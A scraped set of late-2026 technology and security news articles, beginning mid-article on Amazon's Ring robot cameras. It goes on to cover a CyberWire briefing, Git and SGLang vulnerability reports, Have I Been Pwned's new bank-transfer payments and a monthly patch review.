raised concerns that Amazon could use its marketplace to disadvantage rival robot vacuum makers. With this Ring move, Amazon is once again putting robots capable of mapping interior spaces into customers' hands, reviving some of the privacy questions raised during its failed iRobot acquisition. As Amazon explains in Tuesday’s press release, both new Ring robots are powered by AI Pilot, “a custom-built system that uses the devices’ cameras, specialized vision models, on-device sensors, and cloud processing to see, think, and navigate autonomously.” To help the Ring robots understand where they're operating, the devices generate floor plans of interior spaces, according to Amazon. “Carry Ring Drone through your space or let Ring Rover autonomously explore, and it turns what it sees into a floor plan,” the company explains of the setup process. AI Pilot takes the reins in identifying the types of rooms it sees and suggests key patrol areas it should focus on, which users can add to in the Ring app. Amazon claims that videos captured by these new flying and free-wheeling cameras will be protected by an encryption scheme it calls Throw Away the Key Encryption (TAKE). The system temporarily allows Ring's cloud services to access recordings for enabled features before the relevant encryption keys are deleted. Ring announced the scheme in August, presenting it as a way to limit access to customer recordings without sacrificing cloud-powered features. “With TAKE, your Ring videos are protected with unique, rotating encryption keys,” Amazon explained. “A copy of the keys is temporarily held inside a secure enclave within the cloud; think of it as a sealed vault that can only provide Ring access to the key under strict, limited conditions.” The keys, Amazon claims, are later deleted so that only users and those they allow access to can see videos, with Ring only retaining them “to power the intelligent features that you have active on your account.” “We take privacy concerns seriously, and we believe privacy and customer control are fundamental to building products people trust,” a Ring spokesperson told The Register when asked about prior privacy concerns. “That is why customers decide where these devices go and when.” We asked about floor plan security, but didn’t get an answer about that. As for when those devices will be available, the Rover Cam will start shipping on December 16 at a price of about $1,000, but the Drone Cam might not ever actually make it to homes. Amazon’s announcement mentions a release date of January 27, 2027, but that’s subject to the FCC giving its blessing. “Ring Drone Cam has not been authorized as required by the rules of the FCC,” Amazon’s release states. “This device is not, and may not be, offered for sale or lease, or sold or leased, until authorization is obtained.” Amazon told us that the Drone Cam would still start shipping in January, luckily giving everyone a few months to figure out how to deal with this new, more mobile, invasion of privacy. ®

articles.title: AWS refreshes ProcessUnity Global Risk Exchange assessment to enhance customer’s third-party due diligence
articles.context: This assessment approach replaces static spreadsheets with a dynamic system that combines advanced analytics, threat intelligence, and risk models with vendor input
articles.full_text:
Amazon Web Services (AWS) is pleased to announce renewal of the AWS ProcessUnity Global Risk Exchange assessment. This validated assessment report helps customers perform effective cloud supplier due diligence on AWS and enhances their third-party risk management process.

What is the AWS ProcessUnity Global Risk Exchange assessment

Many customers use third-party cyber risk management (TPCRM) services such as ProcessUnity to better manage risks from their evolving third-party environments and to drive operational efficiencies. To help with such efforts, AWS has completed the ProcessUnity Global Risk Exchange assessment of its security posture. ProcessUnity’s assessors perform the review of Global Risk Exchange assessment and validate the results annually.

This assessment approach replaces static spreadsheets with a dynamic system that combines advanced analytics, threat intelligence, and risk models with vendor input. Vendor profiles continuously update as cloud provider risk levels and AWS security posture evolve, keeping risk matrices current in near real time. Additionally, customers can also use Framework View which maps AWS assessment controls to threat profiles, MITRE ATT&CK scenarios, and global compliance standards and frameworks including National Institute of Standards and Technology (NIST) 800-53, International Organization for Standardization (ISO) 27001, Payment Card Industry Data Security Standard (PCI DSS), and Health Insurance Portability and Accountability Act (HIPAA), significantly reducing customers’ third-party due diligence burden.

How can you access the assessment?

Customers can request access to the report by completing an access request form, available on the ProcessUnity Global Risk Exchange page. If you are an existing ProcessUnity Global Risk Exchange member, you can request access from within ProcessUnity Global Risk Exchange portal.

To learn more about our compliance and security programs, see AWS Compliance Programs. As always, we value your feedback and questions; reach out to the AWS Compliance team through the Contact Us page.

Naranjan Goklani

Naranjan is an WS Compliance, Security Assurance and Privacy (CAPS) Lead for Canada. He has experience leading audits, attestations, certifications, and assessments across the Americas. Naranjan has more than 16 years of experience in technology risk management, customer security assurance, and technology audits. He previously worked in the Big 4 accounting firms and supported clients from the financial services, technology, retail, and utilities industries.

articles.title: The next name on CISA's door.
articles.context: The streamlined questionnaire collects more granular incident data—categorizing intrusions across malware, social engineering, and insider threats—while integrating the MITRE ATT&CK framework to align observations with known adversary techniques. While only civilian federal agencies face mandatory reporting...
articles.full_text:
Palantir’s CISO gets the nod for CISA. Tehran takes the rap for sabotaging European grocery freezers. Russia’s Turla turns victim Exchange servers into passive spy hubs. Barracuda battles actively chained gateway zero-days. Vanderbilt grapples with a BYOD ransomware outbreak. CISA rushes patches for critical IBM and SignalWire flaws, while revamping its national incident portal. ENISA tracks the EU’s cyber maturity gap. Cryptographers debate whether AI will crack modern encryption. Our guest is Duncan Greatwood, CEO at Xage Security, discussing the cybersecurity problem you can’t patch away. Chinese AI labs set up shop in Silicon Valley's backyard.

Today is Tuesday November 10th 2026. I’m Dave Bittner. And this is your CyberWire Intel Briefing.

Trump nominates Palantir’s CISO to lead CISA.

The White House has tapped private-sector defense experience to take the helm at CISA.

President Trump nominated Michael LoSapio, chief information security officer at Palantir Technologies, to lead the Cybersecurity and Infrastructure Security Agency. The nomination was sent to the Senate on November ninth and awaits confirmation. If approved, LoSapio will succeed acting director Nick Andersen as the agency’s Senate-confirmed leader.

LoSapio brings over twenty years of systems engineering, cloud infrastructure, and cybersecurity experience to the role. At Palantir, he directed defenses against sophisticated nation-state adversaries, following earlier infrastructure roles at SingleStore and high-performance computing engineering at New York University.

The nomination was announced in an official statement from the White House.

CISA upgrades incident reporting portal with MITRE ATT&CK taxonomy.

CISA is revamping how organizations report cyber incidents, leaning on standardized frameworks to turn disparate breach alerts into actionable national intelligence.

The Cybersecurity and Infrastructure Security Agency rolled out an updated reporting form on its Incident Reporting Portal. The streamlined questionnaire collects more granular incident data—categorizing intrusions across malware, social engineering, and insider threats—while integrating the MITRE ATT&CK framework to align observations with known adversary techniques. While only civilian federal agencies face mandatory reporting requirements under FISMA, CISA urges all critical infrastructure operators to voluntarily submit disclosures.

Standardizing intake across public and private sectors enables analysts to spot broader adversary campaigns faster, proving that one enterprise's early detection can secure an entire ecosystem.

Details were announced in an official agency release citing CISA’s Chris Butera.

ENISA charts EU cyber maturity amid AI and infrastructure threats.

The European Union is taking stock of its collective cyber defenses, and while overall maturity is climbing, the regional threat ecosystem refuses to stand still.

According to ENISA’s biennial State of Cybersecurity in the Union report, the bloc averaged 71.5 points out of 100 on its 2026 Cybersecurity Index. Executive Director Juhan Lepassaar credited robust supply chain governance and research initiatives, but cautioned that recent disruptions—including cyber incidents hitting industrial refrigeration systems—spotlight persistent operational gaps. The assessment also identified uneven incident response capabilities among national CSIRTs alongside an expanding global cyber skills shortage.

While legislative frameworks like the NIS2 Directive push baseline compliance, operational realities diverge as frontier artificial intelligence accelerates automated vulnerability discovery and ideologically driven hacktivism dominates incident volume.

ENISA published the report in cooperation with the European Commission and the NIS Cooperation Group under Article 18 of the NIS2 Directive.

Western officials link Iranian cyber unit to European supermarket sabotage.

State-sponsored cyber sabotage has crossed into everyday retail operations across Europe, spoiling tens of millions of dollars in food.

French officials, backed by American investigators, have tied a wave of cyber incidents affecting supermarket freezers and refrigerators across at least six European nations to Shahid Kaveh, an offensive cyber unit linked to Iran’s Islamic Revolutionary Guard Corps. In France alone, actors remotely altered temperatures at over seven hundred supermarkets, forcing units into defrost cycles and triggering fires and equipment failures. The Paris prosecutor is now pursuing international arrest warrants for the group's leadership.

Targeting internet-accessible industrial control systems reveals a deliberate pivot toward low-complexity, high-impact civilian disruption, testing Western infrastructure resilience well beyond conventional military targets.

French Foreign Minister Jean-Noël Barrot announced the attribution during a G-7 gathering in Paris, while U.S. and European agencies continue ongoing investigations.

Cryptographers debate whether AI advances could unravel modern encryption.

While cybersecurity planners have spent years preparing for quantum decryption, a nearer-term challenge may be arriving from artificial intelligence.

Advances in machine learning are accelerating mathematical discoveries, prompting some researchers to question whether algorithmic shortcuts might unravel the foundational math securing modern encryption. Johns Hopkins cryptographer Matthew Green points to recent breakthroughs in theoretical computer science, while Ethereum creator Vitalik Buterin has called for the industry to proactively develop “post-AI cryptography.”

However, other leading voices urge restraint. Coinbase head of cryptography Yehuda Lindell contends that current post-quantum algorithms are resilient, arguing that speculative panic is premature and that artificial intelligence is just as likely to help defend and harden existing cryptographic primitives.

At stake is the core premise of modern digital trust: if computational shortcuts render previously intractable mathematical problems solvable, upgrading legacy protocols before adversaries exploit them becomes a race against time.

Attackers chain Barracuda ESG flaws for root access in targeted attacks.

Barracuda Networks is urging administrators to patch immediately as threat actors actively target two critical vulnerabilities in its Email Security Gateway appliances.

Tracked as CVE-2026-116606 and CVE-2026-111560, the flaws allow attackers with access to an appliance's administrative interface to bypass authorization controls and execute arbitrary commands with root privileges. While patched last week, Barracuda confirmed on Monday that attackers are already exploiting the chained flaws against a limited number of customer environments. Several other Barracuda products, including its Load Balancer and Web Application Firewall, share the command injection vulnerability.

Securing perimeter email gateways remains a priority for enterprise defense, especially given past nation-state campaigns that weaponized edge appliances for persistent espionage.

Turla deploys stealthy "Cereal" malware targeting Exchange servers.

Russian state-sponsored operators are turning victim email servers into their own operational infrastructure.

ESET Research has detailed "Cereal," a sophisticated, modular .NET malware toolkit attributed to the Russian threat group Turla. Deployed against national government bodies in Kazakhstan and Romania, the malware eliminates dedicated external command-and-control servers. Instead, a passive backdoor listens for incoming malicious web requests disguised as legitimate Outlook Web Access and ActiveSync traffic. Another module, CerealBox, injects directly into Exchange's transport service, in-memory hijacking existing mail handlers to filter and stage messages involving NATO and European Union addresses.

By operating entirely within legitimate enterprise processes and unmanaged .NET image caches, the campaign evades traditional network defenses while weaponizing mission-critical servers as long-term intelligence collection hubs.

Vanderbilt University investigates a cyberattack claimed by BYOD ransomware.

Vanderbilt University is actively responding to a significant cybersecurity incident affecting campus devices, enterprise systems, and cloud infrastructure.

University officials instructed students, faculty, and staff on Monday to power down institutional hardware, disconnect from campus Wi-Fi, and alert IT to suspicious behavior. While the university has not officially confirmed the specific nature of the intrusion, the relatively new BYOD ransomware gang claimed responsibility on its data leak site. The group claims to have encrypted databases and exfiltrated research files alongside personal records for over one million individuals.

Targeting major academic research hubs underscores how rapidly evolving ransomware operations threaten both critical intellectual property and sensitive community data.

CISA adds actively exploited IBM and SignalWire bugs to KEV catalog.

CISA has added critical vulnerabilities affecting IBM Aspera Faspex and SignalWire FreeSwitch to its Known Exploited Vulnerabilities catalog.

Both flaws carry CVSS scores of 9.8. The Faspex bug permits authorization bypass for full administrative takeover, while the FreeSwitch defect enables arbitrary command execution via crafted SIP messages. Mandated under Binding Operational Directive 26-04, federal civilian agencies must apply vendor patches within three days.

Rapid cataloging of these flaws underscores federal urgency to seal network-accessible enterprise tools before widespread automated exploitation takes hold.

Stick with us after the break where we are joined by Duncan Greatwood, CEO at Xage Security, discussing the cybersecurity problem you can’t patch away. And….

On our Industry Voices segment, I sat down with Duncan Greatwood, CEO at Xage Security, discussing the cybersecurity problem you can’t patch away. Here’s our conversation.

If you enjoyed this conversation be sure to check out the show notes for the full interview.

Chinese AI labs set up shop in Silicon Valley's backyard.

Chinese AI companies are taking their talent search straight to Silicon Valley, hoping to recruit the researchers who helped make American AI labs dominant.

MiniMax, Moonshot, and ByteDance are expanding their U.S. hiring efforts, targeting engineers with experience at companies like OpenAI and Anthropic.

But there's a problem. American AI researchers are expensive, with top talent commanding compensation packages exceeding a million dollars annually. Chinese companies generally have smaller budgets, and researchers often prefer working on cutting-edge American models.

There's also the matter of work-life balance. China's notorious “996” schedule—nine to nine, six days a week—is apparently not a particularly compelling recruiting perk.

ByteDance is reportedly offering substantially higher compensation to compete, but money isn't everything.

Meanwhile, Washington's restrictions on Chinese access to advanced technology could eventually extend to talent recruitment.

For now, Chinese AI companies can open offices in Silicon Valley. Convincing Silicon Valley's engineers to join them is another matter.

And that’s the CyberWire.

For links to all of today’s stories, check out our Daily Briefing at the cyberwire dot com.

We’d love to know what you think of this podcast. Your feedback ensures we deliver the insights that keep you a step ahead in the rapidly changing world of cybersecurity. If you like the show, please share a rating and review in your podcast app. Please also fill out the survey in the show notes or send an email to cyberwire@n2k.com

N2K’s lead producer is Liz Stokes. We’re mixed by Tré Hester, with original music by and sound design Elliott Peltzman. Our contributing host is Maria Varmazis. Our executive producer is Jennifer Eiben. Peter Kilpe is our publisher. And I’m Dave Bittner. Thanks for listening.

Finally, Payment by Bank Transfer Comes to Have I Been Pwned
articles.context: That left only two options for orgs in this situation: Don't use Have I Been Pwned at all 😢 Buy a subscription via a reseller 🤢 The problem with the first option is obvious
articles.full_text:
Presently sponsored by: Not every rogue agent is an attack. In a live webinar on Nov 17, Researcher Tyler Holmwood walks through cases of agents going off course.

This is simultaneously the most boring yet exciting blog title I've written in a long time. How you pay for services isn't exactly a sexy topic, but it solves a problem that's been a massive bugbear for a long time.

Here's a brief history of the issue: many organisations have policies that make it extremely hard to purchase goods and services with a credit card. I wrote about this more than two years ago now, where I referred to "Neville" in the procurement department who, because "reasons", demanded an invoice in advance and payment via electronic funds transfer (EFT) only. That ultimately means the world's most popular way to make online payments is out of reach for them. Unfortunately, until today, that was the only way we could take payment via Stripe, which processes all our online HIBP purchases. That left only two options for orgs in this situation:

Don't use Have I Been Pwned at all 😢

Buy a subscription via a reseller 🤢

The problem with the first option is obvious. The second option "solved" the first problem by allowing a company to pay a reseller by EFT, who then paid us by card. The reseller would then mark the price up (often significantly), slow the whole process down, log countless tickets with us (despite the existence of a dedicated portal for them), and frankly, just be a pain in the arse for everyone. It's hard to express the level of disdain I have for most resellers, and I even still have a 1,381-word draft blog post titled "That's it - Resellers are now Banned from Have I Been Pwned", which I held back from posting. Why? Because I've walked in the shoes of the folks trying to purchase our services who are just trying to get their job done, and Neville has told them they can't pay by card. That was me in a previous life, and it sucked. We kept resellers solely to support those people.

But today, HIBP's subscription page has something all new on it:

Stripe has given us early access to EFT payments in Australia. They've been available in the US for a while, but as an Aussie company and with global financial systems being what they are (i.e. not always the most flexible), we just didn't have that option. Until now. So, we've added EFT as a payment method to our Pro and High RPM plans and kept the entry-level Core ones on card only, as there's some additional overhead on our end. You'll see these every time you go to purchase an eligible subscription:

When you choose to pay by bank transfer, you're given a form for your company details (this is how we calculate any applicable taxes), then a Stripe payment link which loads something similar to the following:

The first thing is that, being an Aussie company with an Aussie bank account, we need to reflect EFT payments in AUD rather than USD. It makes sense when you think about it: we do USD for all the existing products paid for by card, and whatever the FX conversion gods decide is the corresponding Aussie amount eventually lands on our end. But that's a model where the card is charged, and access is granted immediately. For EFT, funds flow through the wires, do FX conversion for non-Aussie purchasers, land in the target account and then Stripe webhook magic enables the service. We need that exact amount to land on our end, so we can't be rolling the dice on what exchange rate we're going to get; hence, Stripe requires us to charge in the target currency. The products are exactly the same price based on the rate we currently see via Stripe purchases today (about 69 American cents per Aussie dollar), we'll just have to see if that's revised in the future with any major currency fluctuations.

Next are the banking details. Pretty straightforward, and I'm sure we've all made payments to an account like this before. The main thing is that the account number is a virtual one, which is how Stripe reconciles money that comes in from a previously raised invoice. When you sell a very limited number of products and a bunch of customers are buying the same one, this is how Stripe is then able to reconcile who has paid for what. If you really want to geek out on bank payments, Stripe has a dedicated EFT explainer page.

And finally, subscriptions in HIBP begin as soon as the invoice is raised, but access to the service only begins when payment is made. You can see the problem if we didn't do it this way: bad guy spins up the service and immediately starts using it then just never pays. But this all ties into the quote ecosystem in the existing HIBP dashboard, so it's easy to generate a quote, go flick it to Neville, get it approved, then raise and pay the invoice straight away.

As I said in the opening, it's not the most exciting topic, but it's a major thing for us and the customers who were left with only bad options if they genuinely couldn't pay by card. In the aforementioned draft blog post on binning resellers, I'd written about how we'd seen markups of up to 131% (so yes, more than double the price!), with absolutely zero value add (i.e. they don't do any product support, that remains entirely on us). But the burden resellers really put on us is the support they require to make purchases; in that same draft post, I calculated that resellers accounted for 0.86% of all sales but 43% of all support tickets. That's just nuts, especially for such a small team (although Bruce has helped enormously).

We hope this makes life easier for a bunch of people who were previously stuck between a rock and a hard place, and that includes all the "Nevilles" out there too. This is all now live and accessible via the pricing page. If you run into any issues, Bruce is standing by in the support portal.

Git Patches Flaw That Lets Malicious Repositories Execute Code During Recursive Clones
articles.context: A flaw in Git can let a malicious repository run an attacker's code on a computer that clones it recursively, together with its submodules
articles.full_text:
A flaw in Git can let a malicious repository run an attacker's code on a computer that clones it recursively, together with its submodules. The Git project fixed it this week in Git 2.56.1, with matching fixes for the 2.50 through 2.55 series in 2.50.2, 2.51.3, 2.52.1, 2.53.1, 2.54.1 and 2.55.1.

The flaw, tracked as CVE-2026-111760, is an integer truncation in how Git handles its index. An extremely long path in a repository can pass Git's safety check, but Git then writes it to disk under a shorter name that an attacker can set to .git.

This lets an attacker replace a submodule's .git file with a symbolic link to a folder holding malicious hooks or configuration. Hooks are programs Git runs at set points, so once Git uses that folder, the attacker's code can run.

Submodules matter here because Git refuses to replace a .git folder with a symbolic link, but in a freshly cloned submodule, .git is a file.

The fixed versions, listed in the Git project's release announcement, refuse such extremely long paths before their length can be cut short.

GitHub, which ships Git in its own tools, explained the fixes in a detailed write-up. It advises installing a fixed version from your operating system or Git distributor, and updating any app that ships its own copy of Git.

The company has already applied the fixes to github.com and GitHub Enterprise Cloud. For GitHub Enterprise Server, they are in versions 3.19.15, 3.20.11, 3.21.9 and 3.22.4.

Fixed versions of GitHub Desktop and the GitHub Copilot app are being prepared. GitHub Codespaces and GitHub Actions will also get the fixed Git.

Git for Windows had not released a version based on Git 2.56.1 as of Tuesday at 19:09 UTC, a check of its release tags by The Hacker News found.

Until a fixed version is installed, GitHub suggests these steps, which do not replace the fixes:

Clone only from servers you trust.

Do not recursively clone repositories you do not trust.

Do not merge content or tags you do not trust.

Do not process binary patches or fast-import streams from sources you do not trust.

The Git releases also fix five other flaws:

CVE-2026-113408: When someone clones an empty repository over Git protocol v2, a malicious server can send a branch name that contains path traversal. With the files reference backend, a later update to that branch can then write outside Git's reference folder.

CVE-2026-114467: Merging a tag that carries more than two GPG signatures corrupts Git's stack memory and can cause a denial of service. Hosting services that run such merges for users may also be affected.

CVE-2026-114469: A binary patch that expands to a very large size can get past Git's patch size limit of about 1 GiB and crash Git with an out-of-bounds read.

CVE-2026-105437: A very large merge, with many conflicts and a large conflict-marker-size attribute, can make Git write past the end of a buffer that is too small, corrupting heap memory.

CVE-2026-114466: Three git fast-import features, rewrite-submodules-from, rewrite-submodules-to and export-pack-edges, could be used to read arbitrary files or to create files and add data to them. Git now rejects them in an input stream unless --allow-unsafe-features is set.

GitLab, which assigned CVE-2026-105437, said code-hosting servers are most likely to be targeted through git merge-tree. A server may run that command to check whether a pull or merge request can be merged.

The conflict-marker-size attribute can be set in a .gitattributes file committed to a repository. If a server reads attributes from the repository, any user who can push branches and open a pull or merge request can trigger the flaw.

As a workaround for this flaw, servers that cannot upgrade yet can add conflict-marker-size=7 to each repository's info/attributes file, or turn off those merge checks for untrusted repositories.

articles.title: SGLang RCE Exploit Breaches NEAR AI, Steals Data From 18 Agents and About 100 Users
articles.context: An attacker exploited a remote code execution flaw in SGLang, an open-source inference engine, and ran code on one of NEAR AI's inference servers last Sunday
articles.full_text:
An attacker exploited a remote code execution flaw in SGLang, an open-source inference engine, and ran code on one of NEAR AI's inference servers last Sunday.

The attacker could also have seen requests being processed on that server that day, including requests sent in confidential mode, the company said earlier this week. That mode processes requests inside a trusted execution environment (TEE) designed to keep them private even from the company itself.

But the TEE "does not protect against a vulnerability in the software running inside the environment," the company said. SGLang runs inside the TEE, which is how the attacker could reach requests there.

That access has since been closed, but not before the attacker moved further into the company's systems.

The attacker reached an internal system behind Private Chat, a product the company had already deprecated. So far, the company has confirmed that the attacker downloaded account details for about 100 users there. These are email addresses and names, and for some accounts, plan and balance information.

The company found no sign that stored Private Chat conversations or uploaded files were accessed.

The attacker also reached 18 AI agents on an older deployment of NEAR AI Agents that did not run inside the company's TEE. From those agents, the attacker took data including chat history, settings and logs.

Two customers' NEAR AI Cloud API keys were exposed in logs. The company has revoked both.

After detecting the attack, the company revoked all active sessions and administrator credentials, replaced all agent tokens and took Private Chat offline. It also deployed a fix for the SGLang flaw on all of its inference servers, rotated its remaining credentials and completed a full forensic review, according to its incident report.

Access to its NEAR AI Cloud service has been restored. The company reported the flaw to the SGLang project. It has not identified the flaw by CVE number, named the affected SGLang versions, or said whether the project has released a fix.

The company has contacted users whose account details or agents it confirmed were accessed. Affected users heard directly from security@near.ai, with the steps that apply to them. As a precaution, the company asks users to be careful with messages about their account or balance that they did not ask for.

In a follow-up post yesterday, it said users who have not heard from it do not need to do anything. It has not said whether people whose requests passed through the affected server last Sunday were among those contacted.

In an October 15 technical write-up, Brave, the browser maker, said its Leo assistant runs chats with the GLM 5.3 Flash model inside a TEE operated by NEAR AI.

NEAR AI has not said whether the affected server handled any of those chats.

articles.title: The November 2026 Security Update Review
articles.context: - CVE-2026-119958 - Windows LDAP - Lightweight Directory Access Protocol Remote Code Execution VulnerabilityThis patch addresses a bug that allows an unauthenticated attacker to...

The penultimate month of 2026 bring with it the usual storm of patches from Microsoft and Adobe. I’ve been prototyping some new ways to display this data, but as always, I’m open to suggestions. Seriously – hit me up on Bluesky if you have any ideas.If you’d rather watch the full video recap covering the entire release, you can check it out here:

Adobe Patches for November 2026

For the first part of the November release, Adobe released nine bulletins addressing 110 unique CVEs in Adobe Connect, Experience Manager, After Effects, Audition, Dimension, Photoshop, Media Encoder, Premiere, and Content Credentials SDK.
